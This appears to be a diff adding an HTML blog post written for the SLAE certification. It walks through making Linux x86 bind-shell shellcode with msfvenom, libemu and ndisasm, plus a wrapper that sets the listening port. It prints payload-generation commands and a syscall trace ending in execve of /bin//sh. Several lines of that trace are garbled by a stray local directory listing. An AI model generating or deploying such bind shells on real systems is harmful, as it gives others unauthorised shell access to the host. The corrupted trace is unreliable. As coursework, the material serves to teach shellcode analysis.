@@ -1,0 +1,256 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.0/css/bootstrap.min.css">
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.0/js/bootstrap.min.js"></script>
+
+</head>
+
+<body>
+<div class="container">
+
+<br>
+<br>
+<h2> Assignment 1: Shell_Bind_TCP shellcode</h2><br>
+<br>
+- Create a Shell_Bind_TCP shellcode<br>
+<br>
+    - Binds to a port<br>
+<br>
+    - Execs Shell on incoming connection<br>
+<br>
+- Port number should be easily configurable<br>
+<br>
+<br>
+<h2> Usage</h2><br>
+<code><h4>python wrapper.py $PORT
+</h4></code>
+<br>
+<br>
+Example with port 7777:<br>
+<br>
+<img src="https://github.com/ricardojoserf/slae/blob/master/a1_Shell_Bind_Tcp/images/wrapper/5.png?raw=true"><br>
+<br>
+Then it can be compiled and executed:<br>
+<br>
+<img src="https://github.com/ricardojoserf/slae/blob/master/a1_Shell_Bind_Tcp/images/wrapper/51.png?raw=true"><br>
+<br>
+Result:<br>
+<br>
+<img src="https://github.com/ricardojoserf/slae/blob/master/a1_Shell_Bind_Tcp/images/wrapper/52.png?raw=true"><br>
+<br>
+If the port causes problems, a warning message will appear:<br>
+<br>
+<img src="https://github.com/ricardojoserf/slae/blob/master/a1_Shell_Bind_Tcp/images/wrapper/6.png?raw=true"><br>
+<br>
+<br>
+<br>
+<h2> First approach: Libemu</h2><br>
+<br>
+After installing Libemu, we will use the <i>sctest</i> binary. We can get the result using the binary directly or the <i>libemu.sh</i> script (in <b>scripts/</b> folder):<br>
+<code><h4>msfvenom -p linux/x86/shell_bind_tcp --platform=Linux -a x86 -f raw LPORT=8888 | ./sctest -vvv -Ss 10000 -G bindshell.dot
+</code></h4><br>
+Or we can use the libemu.sh script (in scripts/ folder):<br>
+<br>
+</code></h4>sh libemu.sh "msfvenom -p linux/x86/shell_bind_tcp --platform=Linux -a x86 -f raw LPORT=8888" bindshell | tee libemu_res/libemu_res.txt
+</code></h4><br>
+<br>
+The result:
+<code><h4>int socket (<br>
+int domain = 2;<br>
+int type = 1;<br>
+int protocol = 0;<br>
+) = 14;<br>
+int bind (<br>
+int sockfd = 14;<br>
+struct sockaddr_in a ddos_simulation Desktop dit_instafollowers_bot.html Documents Downloads examples.desktop github-bot html-wrapper.py instagram-followers-bot Music NoSQL-injection-example Pictures Public pywisam ricardojruiz.herokuapp.com sc.sh slae snap spotify-playlist-downloader Templates triangle-position twitter-followers-bot users.txt user.txt Videos my_addr = 0x00416fc2 =><br>
+struct = {<br>
+short sin_family = 2;<br>
+unsigned short sin_port = 47138 (port=8888);<br>
+struct in_addr sin_addr = {<br>
+unsigned long s_addr = 0 (host=0.0.0.0);<br>
+};<br>
+char sin_zero = " ";<br>
+};<br>
+int addrlen = 16;<br>
+) = 0;<br>
+int listen (<br>
+int s = 14;<br>
+int backlog = 0;<br>
+) = 0;<br>
+int accept (<br>
+int sockfd = 14;<br>
+sockaddr_in a ddos_simulation Desktop dit_instafollowers_bot.html Documents Downloads examples.desktop github-bot html-wrapper.py instagram-followers-bot Music NoSQL-injection-example Pictures Public pywisam ricardojruiz.herokuapp.com sc.sh slae snap spotify-playlist-downloader Templates triangle-position twitter-followers-bot users.txt user.txt Videos addr = 0x00000000 =><br>
+none;<br>
+int addrlen = 0x00000010 =><br>
+none;<br>
+) = 19;<br>
+int dup2 (<br>
+int oldfd = 19;<br>
+int newfd = 14;<br>
+) = 14;<br>
+int dup2 (<br>
+int oldfd = 19;<br>
+int newfd = 13;<br>
+) = 13;<br>
+int dup2 (<br>
+int oldfd = 19;<br>
+int newfd = 12;<br>
+) = 12;<br>
+int dup2 (<br>
+int oldfd = 19;<br>
+int newfd = 11;<br>
+) = 11;<br>
+int dup2 (<br>
+int oldfd = 19;<br>
+int newfd = 10;<br>
+) = 10;<br>
+int dup2 (<br>
+int oldfd = 19;<br>
+int newfd = 9;<br>
+) = 9;<br>
+int dup2 (<br>
+int oldfd = 19;<br>
+int newfd = 8;<br>
+) = 8;<br>
+int dup2 (<br>
+int oldfd = 19;<br>
+int newfd = 7;<br>
+) = 7;<br>
+int dup2 (<br>
+int oldfd = 19;<br>
+int newfd = 6;<br>
+) = 6;<br>
+int dup2 (<br>
+int oldfd = 19;<br>
+int newfd = 5;<br>
+) = 5;<br>
+int dup2 (<br>
+int oldfd = 19;<br>
+int newfd = 4;<br>
+) = 4;<br>
+int dup2 (<br>
+int oldfd = 19;<br>
+int newfd = 3;<br>
+) = 3;<br>
+int dup2 (<br>
+int oldfd = 19;<br>
+int newfd = 2;<br>
+) = 2;<br>
+int dup2 (<br>
+int oldfd = 19;<br>
+int newfd = 1;<br>
+) = 1;<br>
+int dup2 (<br>
+int oldfd = 19;<br>
+int newfd = 0;<br>
+) = 0;<br>
+int execve (<br>
+const char a ddos_simulation Desktop dit_instafollowers_bot.html Documents Downloads examples.desktop github-bot html-wrapper.py instagram-followers-bot Music NoSQL-injection-example Pictures Public pywisam ricardojruiz.herokuapp.com sc.sh slae snap spotify-playlist-downloader Templates triangle-position twitter-followers-bot users.txt user.txt Videos dateiname = 0x00416fb2 =><br>
+= "/bin//sh";<br>
+const char a ddos_simulation Desktop dit_instafollowers_bot.html Documents Downloads examples.desktop github-bot html-wrapper.py instagram-followers-bot Music NoSQL-injection-example Pictures Public pywisam ricardojruiz.herokuapp.com sc.sh slae snap spotify-playlist-downloader Templates triangle-position twitter-followers-bot users.txt user.txt Videos argv[] = [<br>
+= 0x00416faa =><br>
+= 0x00416fb2 =><br>
+= "/bin//sh";<br>
+= 0x00000000 =><br>
+none;<br>
+];<br>
+const char a ddos_simulation Desktop dit_instafollowers_bot.html Documents Downloads examples.desktop github-bot html-wrapper.py instagram-followers-bot Music NoSQL-injection-example Pictures Public pywisam ricardojruiz.herokuapp.com sc.sh slae snap spotify-playlist-downloader Templates triangle-position twitter-followers-bot users.txt user.txt Videos envp[] = 0x00000000 =><br>
+none;<br>
+) = 0;<br>
+</code></h4>
+<br>
+<br>
+Once we know the system calls or syscalls, the values used in them and the order, it is necessary to get the hexadecimal values for every syscall, using cat and printf to print the hexadecimal value:<br>
+<code><h4>cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep listen
+
+printf "%x\n" 363
+</code></h4><br>
+Or the <i>syscallhex.sh</i> script (in <b>scripts/</b> folder)<br>
+<code><h4>sh syscallhex.sh listen
+</code></h4><br>
+<br>
+The system calls and their values are:<br>
+<br>
+- Socket: 359 (0x167)<br>
+<br>
+- Bind:     361 (0x169)<br>
+<br>
+- Listen:   363 (0x16b<br>
+<br>
+- Accept:   364 (0x16c)<br>
+<br>
+- Dup2:     63 (0x3f)<br>
+<br>
+- Execve:   11 (0xb)<br>
+<br>
+<br>
+Also it is important to know how the system calls work in Linux. As stated in the [Skape's paper about egghunters](http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf) "the system call interface that is exposed to user-mode applications in Linux (on IA32) is provided through soft-interrupt 0x80. The following table describes the register layout that is used across all system calls"<br>
+<br>
+<img src="https://github.com/ricardojoserf/slae/blob/master/a1_Shell_Bind_Tcp/images/7.png?raw=true"><br>
+<br>
+Knowing this and the values from the Libemu's output, it is possible to write the nasm code.<br>
+<br>
+<br>
+<h3> Creating the Python wrapper </h3>
+<br>
+Get the shellcode changing the "\\" to "\\\\":<br>
+<br>
+<img src="https://github.com/ricardojoserf/slae/blob/master/a1_Shell_Bind_Tcp/images/wrapper/2.png?raw=true"><br>
+<br>
+Detect where the port (8888 or 0x22b8 in hexadecimal) is being used:<br>
+<br>
+<img src="https://github.com/ricardojoserf/slae/blob/master/a1_Shell_Bind_Tcp/images/wrapper/3.png?raw=true"><br>
+<br>
+Now we know the value in the original shellcode which must be substituted:<br>
+<br>
+<img src="https://github.com/ricardojoserf/slae/blob/master/a1_Shell_Bind_Tcp/images/wrapper/4.png?raw=true"><br>
+<br>
+After this, we just must take the input to the wrapper script, translate the port number to hexadecimal (in big endian format) and print the new shellcode with the port updated.<br>
+<br>
+<br>
+<h2> Second approach: Ndisasm</h2><br>
+<br>
+A second approach, which can be considered easier, is to get the nasm file from the raw output from msfvenom:<br>
+<code><h4>msfvenom -p linux/x86/shell_bind_tcp LPORT=8888 --platform=Linux -a x86 -f raw | ndisasm -u -
+</code></h4><br>
+<img src="https://github.com/ricardojoserf/slae/blob/master/a1_Shell_Bind_Tcp/images/wrapper/8.png?raw=true"><br>
+<br>
+It can be compiled:<br>
+<br>
+<img src="https://github.com/ricardojoserf/slae/blob/master/a1_Shell_Bind_Tcp/images/wrapper/9.png?raw=true"><br>
+<br>
+And it works correctly:<br>
+<br>
+<img src="https://github.com/ricardojoserf/slae/blob/master/a1_Shell_Bind_Tcp/images/wrapper/10.png?raw=true"><br>
+<br>
+This is included in the <b>ndisasm_approach</b> folder, but the wrapper has been developed and tested only for the first approach.<br>
+<br>
+<br>
+<h2> Some useful links</h2><br>
+- http://man7.org/linux/man-pages/man2/socket.2.html<br>
+- https://stackoverflow.com/questions/19850082/using-nasm-and-tcp-sockets<br>
+- http://man7.org/linux/man-pages/man2/socket.2.html<br>
+- https://rosettacode.org/wiki/Sockets<br>
+- http://www6.uniovi.es/cscene/CS5/CS5-05.html<br>
+- https://stackoverflow.com/questions/48773917/why-creating-a-remote-shell-using-execve-doesnt-overwrite-file-descriptors-and<br>
+- https://www.tutorialspoint.com/assembly_programming/assembly_system_calls.htm<br>
+- https://forum.nasm.us/index.php?topic=889.0<br>
+<br>
+<br>
+<h2> Note</h2><br>
+<br>
+This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: https://www.pentesteracademy.com/course?id=3<br>
+<br>
+Student ID: SLAE - 1433<br>
+
+<br>
+<br>
+
+</div>
+</body>
+</html>
